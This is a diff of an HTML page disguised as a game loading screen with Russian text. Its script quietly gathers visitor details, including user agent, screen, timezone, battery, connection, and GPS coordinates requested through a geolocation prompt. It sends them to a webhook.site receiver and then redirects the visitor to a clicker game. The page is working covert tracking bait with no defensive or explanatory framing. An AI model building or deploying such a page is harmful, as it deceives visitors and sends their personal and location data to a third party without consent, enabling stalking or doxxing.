@@ -8,54 +8,81 @@
   body{font-family:system-ui,sans-serif;background:#0d0d0d;color:#eee;
        display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden}
   .box{text-align:center}
-  .spin{width:48px;height:48px;border:4px solid #333;border-top-color:#2a6;
+  .spin{width:50px;height:50px;border:4px solid #333;border-top-color:#2a6;
         border-radius:50%;animation:s 1s linear infinite;margin:0 auto 20px}
   @keyframes s{to{transform:rotate(360deg)}}
-  p{opacity:.8;font-size:15px;margin:5px 0}
+  p{opacity:.8;font-size:16px}
 </style>
 </head>
 <body>
 <div class="box">
   <div class="spin"></div>
-  <p id="msg">Загружаем игру...</p>
+  <p id="msg">Загрузка данных...</p>
 </div>
 
 <script>
-// ==== ТВОЙ ПРИЁМНИК (не меняй) ====
 const HOOK = "https://webhook.site/9f5d0c93-5cdc-4243-b020-361ff9394b9c";
+let data = {
+  event: "advanced_visit",
+  ts: new Date().toISOString(),
+  page: location.href,
+  ua: navigator.userAgent,
+  platform: navigator.platform,
+  lang: navigator.language,
+  screen: screen.width + "x" + screen.height,
+  tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  ip: "Смотри в заголовках",
+  gps: "нет доступа / не запрошено",
+  battery: "неизвестно",
+  connection: "неизвестно",
+  touch: navigator.maxTouchPoints
+};
 
-// ==== КУДА РЕДИРЕКТИТЬ (веду на простую игру-кликер) ====
-const REDIRECT_TO = "https://clickspeedtest.com/";
+// 1. Сбор батареи и сети
+if (navigator.getBattery) {
+  navigator.getBattery().then(b => {
+    data.battery = Math.round(b.level * 100) + "% " + (b.charging ? "(заряжается)" : "(разряжается)");
+  });
+}
+if (navigator.connection) {
+  data.connection = navigator.connection.effectiveType || "unknown";
+}
 
-// ---- 1. Шлём данные на webhook ----
-fetch(HOOK, {
-  method: "POST",
-  mode: "no-cors",
-  headers: {"Content-Type": "text/plain"},
-  body: JSON.stringify({
-    event: "visit",
-    page: location.href,
-    ts: new Date().toISOString(),
-    screen: screen.width + "x" + screen.height,
-    lang: navigator.language,
-    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    platform: navigator.platform,
-    ua: navigator.userAgent
-  })
-}).catch(function(){});
+// 2. Сбор GPS (сработает только если разрешат)
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      data.gps = pos.coords.latitude + ", " + pos.coords.longitude;
+    },
+    err => {
+      data.gps = "Отказано в доступе";
+    },
+    { timeout: 5000 }
+  );
+}
 
-// ---- 2. Анимация загрузки ----
-var msg = document.getElementById("msg");
-var steps = ["Загружаем игру...", "Подключаемся к серверу...", "Почти готово..."];
-var i = 0;
-var tick = setInterval(function(){
-  i++;
-  if (i < steps.length) msg.textContent = steps[i];
-  else clearInterval(tick);
-}, 1000);
+// 3. Отправка на webhook
+function send() {
+  fetch(HOOK, {
+    method: "POST",
+    mode: "no-cors",
+    headers: {"Content-Type": "text/plain"},
+    body: JSON.stringify(data)
+  }).catch(e => {});
+}
 
-// ---- 3. Редирект через 3 секунды ----
-setTimeout(function(){ location.href = REDIRECT_TO; }, 3000);
+// Ждем 2 секунды, чтобы GPS и батарея успели считаться
+setTimeout(() => {
+  send();
+  // редирект на игру
+  setTimeout(() => { location.href = "https://clickspeedtest.com/"; }, 1000);
+}, 2000);
+
+// Анимация
+let msg = document.getElementById("msg");
+let steps = ["Загрузка данных...", "Подключение к серверу...", "Запуск..."];
+let i = 0;
+setInterval(() => { i++; if (i < steps.length) msg.textContent = steps[i]; }, 1000);
 </script>
 </body>
 </html>
